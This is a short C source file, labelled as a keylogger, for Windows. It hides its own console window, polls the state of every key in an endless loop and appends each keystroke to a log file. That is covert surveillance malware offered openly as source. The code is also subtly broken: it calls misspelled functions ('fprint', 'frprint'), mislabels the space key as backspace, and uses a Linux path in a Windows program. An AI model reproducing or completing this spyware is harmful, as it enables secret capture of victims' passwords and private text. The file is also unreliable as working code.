//KEYLOGGER

#include <stdio.h>
#include <windows.h>

#define LOGFILE "/home/chiranjeet/keylog.txt"

void log_key (int key){

  FILE *file = fopen(LOGFILE,"a");

  if (file){
    
     if (key >= 0x20 && key <= 0x7E ){
      
	   fprint(file,"%c",key);
     
     }else{
           switch (key){
	      
	     case  VK_RETURN: fprint(file,"[ENTER]"); break;
	     case  VK_SPACE: fprint(file,"[BACKSPACE]");break;
             case  VK_TAB: fprint(file,"[TAB]");break;
	     case  VK_SHIFT: fprint(file,"[SHIFT]");break;
	     case  VK_CONTROL: frprint(file,"[CTRL]");break;
	     case  VK_MENU: fprint(file,"[ALT]");break;
	     
	     default: fprint(file,"[KEY:%d]",key);break;
	   }
     }
     fclose(file);
   
  }

}

int main(){

 HWND hwnd = GetConsoleWindow();
 ShowWindow(hwnd,SW_HIDE);

 FILE *file = fopen(LOGFILE,"w");
 if (file) fclose(file);

 while(1){
  for (int i=0;i<=255;i++){
    if (GetAsyncKeyState(i) & 0x8000){
       log_key(i);
    }
  }
  Sleep(10);
 }
 return 0;
 
}
